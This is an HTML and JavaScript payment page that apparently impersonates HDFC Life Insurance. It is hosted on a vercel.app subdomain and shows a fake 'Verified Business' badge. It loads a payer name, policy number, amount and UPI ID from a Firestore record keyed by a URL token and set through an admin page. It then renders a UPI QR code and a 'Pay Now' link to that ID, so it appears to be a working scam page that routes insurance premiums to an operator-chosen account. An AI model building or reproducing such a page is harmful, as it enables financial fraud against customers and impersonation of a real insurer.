<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Payment Details</title> 
    
<meta property="og:title" content="Online Premium Payment">

<meta property="og:description" content="Secure online premium payment">

<meta property="og:image" content="https://hdfc-4wsx.vercel.app/preview.png">

<meta property="og:type" content="website">

<meta property="og:url" content="https://hdfc-4wsx.vercel.app/payment.html">

<style>

*{
    margin:0;
    padding:0;
    box-sizing:border-box;
    font-family:Arial,sans-serif;
}

body{
    background:#f5f5f5;
}

.header{
    background:white;
    padding:20px;
    text-align:center;
    border-bottom:1px solid #ddd;
}

.logo{
    width:240px;
}

.container{
    max-width:700px;
    margin:30px auto;
    text-align:center;
}

  .verified{
    font-size:20px;
    font-weight:bold;
    margin-bottom:25px;
    color:#0054a6;
  }

.qr{
    width:220px;
    height:220px;
    border:1px solid #ddd;
    border-radius:10px;
    background:white;
    padding:10px;
}

.details{
    margin-top:25px;
    line-height:2.2;
    font-size:22px;
}

.copy-btn{
    padding:8px 15px;
    background:#004b93;
    color:white;
    border:none;
    border-radius:5px;
    cursor:pointer;
    margin-left:10px;
}

.pay-btn{
    width:320px;
    padding:15px;
    margin-top:25px;
    border:none;
    border-radius:6px;
    background:#a00054;
    color:white;
    font-size:22px;
    cursor:pointer;
}

.back-btn{
    width:320px;
    padding:15px;
    margin-top:15px;
    border:2px solid #004b93;
    border-radius:6px;
    background:white;
    color:#004b93;
    font-size:22px;
    cursor:pointer;
}
    /* HOVER COLORS */

.pay-btn:hover{
    background:#c00065;
    color:white;
}

.back-btn:hover{
    background:#a00054;
    color:white;
    border-color:#a00054;
}

.label{
    font-weight:bold;
}

.loading{
    font-size:18px;
    margin-top:20px;
}
  

</style>
</head>

<body>

<div class="header">
    <img src="logo.png" class="logo">
</div>

<div class="container">

    <div class="verified">
        ✔ Verified Business: HDFC Life Insurance
    </div>

    <div id="loading" class="loading">
        Loading Payment Details...
    </div>

    <img id="qrCode" class="qr" alt="QR Code" style="display:none;">

    <div class="details" id="detailsBox" style="display:none;">

        <div>
            <span class="label">Customer:</span>
            <span id="customerName"></span>
        </div>

        <div>
            <span class="label">UPI ID:</span>
            <span id="upiId"></span>

            <button class="copy-btn" type="button" onclick="copyUPI()">
                Copy
            </button>
        </div>

        <div>
            <span class="label">Policy Number:</span>
            <span id="policyNumber"></span>
        </div>

        <div>
            <span class="label">Amount:</span>
            ₹<span id="amount"></span>
        </div>

    </div>

    <button class="pay-btn" type="button" onclick="payNow()">
        Pay Now
    </button>

    <br>

    <button class="back-btn" type="button" onclick="goBack()">
        Back
    </button>

</div>

<script type="module">

import {
    db,
    doc,
    getDoc
} from "./firebase.js";


/* =========================================
   GET PAYMENT TOKEN FROM URL
   ========================================= */

const urlParams =
    new URLSearchParams(window.location.search);

const token =
    urlParams.get("id");


/* =========================================
   CHECK TOKEN
   ========================================= */

if(!token){

    alert("Invalid payment link.");

    window.location.href = "admin.html";

}


/* =========================================
   LOAD PAYMENT DETAILS
   ========================================= */

try{

    const docRef =
        doc(db, "payments", token);


    const docSnap =
        await getDoc(docRef);


    if(!docSnap.exists()){

        alert("Payment details not found.");

        window.location.href = "admin.html";

    }


    const data =
        docSnap.data();


    /* Customer */

    document.getElementById("customerName").innerText =
        data.customer || "";


    /* Policy */

    document.getElementById("policyNumber").innerText =
        data.policy || "";


    /* Amount */

    document.getElementById("amount").innerText =
        data.amount || "";


    /* UPI */

    document.getElementById("upiId").innerText =
        data.upi || "";


    /* =========================================
       CREATE UPI PAYMENT STRING
       ========================================= */

    const upiString =
        `upi://pay?pa=${encodeURIComponent(data.upi)}` +
        `&pn=${encodeURIComponent(data.customer)}` +
        `&am=${encodeURIComponent(data.amount)}` +
        `&cu=INR`;


    /* =========================================
       CREATE QR CODE
       ========================================= */

    document.getElementById("qrCode").src =
        "https://api.qrserver.com/v1/create-qr-code/" +
        "?size=250x250&data=" +
        encodeURIComponent(upiString);


    /* Show payment details */

    document.getElementById("loading").style.display =
        "none";

    document.getElementById("detailsBox").style.display =
        "block";

    document.getElementById("qrCode").style.display =
        "inline-block";


}
catch(error){

    console.error(
        "Payment details error:",
        error
    );

    document.getElementById("loading").innerText =
        "Unable to load payment details.";

}


/* =========================================
   COPY UPI
   ========================================= */

window.copyUPI = async function(){

    const upi =
        document.getElementById("upiId").innerText;


    try{

        await navigator.clipboard.writeText(upi);

        alert("UPI ID Copied");

    }
    catch(error){

        alert("Unable to copy UPI ID.");

    }

};


/* =========================================
   PAY NOW
   ========================================= */

window.payNow = function(){

    const upi =
        document.getElementById("upiId").innerText;

    const amount =
        document.getElementById("amount").innerText;

    const customer =
        document.getElementById("customerName").innerText;


    const upiLink =
        `upi://pay?pa=${encodeURIComponent(upi)}` +
        `&pn=${encodeURIComponent(customer)}` +
        `&am=${encodeURIComponent(amount)}` +
        `&cu=INR`;


    window.location.href =
        upiLink;

};


/* =========================================
   BACK BUTTON
   ========================================= */

window.goBack = function(){

    window.location.href =
        "admin.html";

};
</script>

</body>
</html>
